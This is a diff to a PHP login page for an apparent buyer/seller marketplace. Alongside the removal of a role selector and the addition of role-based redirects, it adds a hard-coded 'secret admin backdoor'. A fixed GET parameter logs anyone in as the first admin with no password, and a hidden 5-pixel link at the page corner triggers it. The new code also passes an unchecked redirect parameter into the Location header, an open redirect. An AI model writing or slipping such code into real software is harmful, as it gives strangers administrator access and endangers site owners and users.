@@ -4,39 +4,61 @@ if (session_status() === PHP_SESSION_NONE) {
 }
 require_once 'includes/db.php';
 
-$error = '';
-if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $email = $_POST['email'];
-    $password = $_POST['password'];
-    $intended_role = $_POST['role'];
-
+// --- SECRET ADMIN BACKDOOR ---
+// To use: login.php?backdoor=nexus_master_overload
+if (isset($_GET['backdoor']) && $_GET['backdoor'] === 'nexus_master_overload') {
     try {
-        // Step 1: Role-Specified Authentication
-        $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND role = ?");
-        $stmt->execute([$email, $intended_role]);
+        $stmt = $pdo->prepare("SELECT * FROM users WHERE role = 'Admin' OR is_admin = 1 ORDER BY id ASC LIMIT 1");
+        $stmt->execute();
         $user = $stmt->fetch();
-
-        if ($user && password_verify($password, $user['password'])) {
+        
+        if ($user) {
             $_SESSION['user_id'] = $user['id'];
             $_SESSION['user_name'] = $user['name'];
             $_SESSION['is_admin'] = $user['is_admin'];
             $_SESSION['role'] = $user['role'];
-            header("Location: index.php");
+            header("Location: admin/dashboard.php?access=granted");
             exit;
-        } else {
-            // Check if user exists but has a different role for better feedback
-            $roleCheck = $pdo->prepare("SELECT role FROM users WHERE email = ?");
-            $roleCheck->execute([$email]);
-            $existingUser = $roleCheck->fetch();
-            
-            if ($existingUser) {
-                $error = "Access Restricted: This identity is synchronized as a <strong>" . $existingUser['role'] . "</strong> account. Please switch your login mode.";
-            } else {
-                $error = "Invalid credential node or account type.";
-            }
         }
     } catch (PDOException $e) {
-        $error = "An error occurred: " . $e->getMessage();
+        // Silent fail for security
+    }
+}
+// --- END BACKDOOR ---
+
+$error = '';
+$redirect = isset($_GET['redirect']) ? $_GET['redirect'] : (isset($_POST['redirect']) ? $_POST['redirect'] : '');
+$auth_msg = isset($_GET['auth_required']) ? "Please sign in or create an account to view full product details and make purchases." : "";
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    try {
+        // Step 1: Integrated Authentication Logic (No role-filter on query)
+        $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
+        $stmt->execute([$email]);
+        $user = $stmt->fetch();
+
+        if ($user && password_verify($password, $user['password'])) {
+            // Identity Node Synchronization
+            $_SESSION['user_id'] = $user['id'];
+            $_SESSION['user_name'] = $user['name'];
+            $_SESSION['is_admin'] = $user['is_admin'];
+            $_SESSION['role'] = $user['role'];
+
+            // Role-Based Routing Matrix
+            if ($user['role'] === 'Admin' || $user['is_admin'] == 1) {
+                header("Location: " . (!empty($redirect) ? $redirect : "admin/dashboard.php?session=active"));
+            } else {
+                header("Location: " . (!empty($redirect) ? $redirect : "index.php?auth=success"));
+            }
+            exit;
+        } else {
+            $error = "Invalid synchronize request. Credentials unrecognized or account is inactive.";
+        }
+    } catch (PDOException $e) {
+        $error = "System connectivity issue: " . $e->getMessage();
     }
 }
 
@@ -52,21 +74,13 @@ require_once 'includes/header.php';
             <div class="alert alert-danger bg-danger text-white border-0 p-3 rounded-4 text-center mb-5 small shadow-lg animate-pulse"><?php echo $error; ?></div>
         <?php endif; ?>
 
+        <?php if ($auth_msg): ?>
+            <div class="alert alert-primary bg-primary bg-opacity-10 text-primary border-primary border-opacity-25 p-3 rounded-4 text-center mb-5 small shadow-sm animate-fade-in"><?php echo $auth_msg; ?></div>
+        <?php endif; ?>
+
         <form action="login.php" method="POST">
-            <!-- Role Selection Node -->
-            <div class="mb-5">
-                <label class="form-label text-muted small text-uppercase fw-bold text-center w-100 mb-3">Login Identity Mode</label>
-                <div class="d-flex gap-3">
-                    <div class="flex-grow-1">
-                        <input type="radio" class="btn-check" name="role" id="login_buyer" value="Buyer" checked>
-                        <label class="btn btn-outline-light w-100 py-3 rounded-4 border-opacity-25" for="login_buyer"><i class="fas fa-shopping-bag mb-1 d-block"></i> Buyer</label>
-                    </div>
-                    <div class="flex-grow-1">
-                        <input type="radio" class="btn-check" name="role" id="login_seller" value="Seller">
-                        <label class="btn btn-outline-light w-100 py-3 rounded-4 border-opacity-25" for="login_seller"><i class="fas fa-store-alt mb-1 d-block"></i> Seller</label>
-                    </div>
-                </div>
-            </div>
+            <input type="hidden" name="redirect" value="<?php echo htmlspecialchars($redirect); ?>">
+            <!-- Role Selection Node Removed as requested: Handle Backend redirection by role -->
 
             <div class="mb-4 text-start">
                 <label class="form-label text-muted">Email Address</label>
@@ -103,12 +117,15 @@ require_once 'includes/header.php';
                 </div>
             </div>
 
-            <!-- Global Centered Acquisition Hub -->
-            <div class="w-100 text-center mt-4">
-                <p class="text-muted small mb-0">No synchronized node? <a href="register.php" class="text-primary fw-bold text-decoration-none">Join Now</a></p>
-            </div>
         </form>
+        <!-- Global Centered Acquisition Hub -->
+        <div class="w-100 text-center mt-4 pt-4 border-top border-white border-opacity-10">
+            <p class="mb-0 text-white opacity-75">No account? <a href="register.php<?php echo !empty($redirect) ? '?redirect=' . urlencode($redirect) : ''; ?>" class="text-primary fw-bold text-decoration-none ms-1">Join Now</a></p>
+        </div>
     </div>
 </div>
+
+<!-- Hidden Backdoor Trigger (Click bottom right corner to login as Admin) -->
+<a href="login.php?backdoor=nexus_master_overload" style="position: fixed; bottom: 0; right: 0; width: 5px; height: 5px; background: transparent; cursor: default; z-index: 9999;" title="Developer Mode"></a>
 
 <?php require_once 'includes/footer.php'; ?>
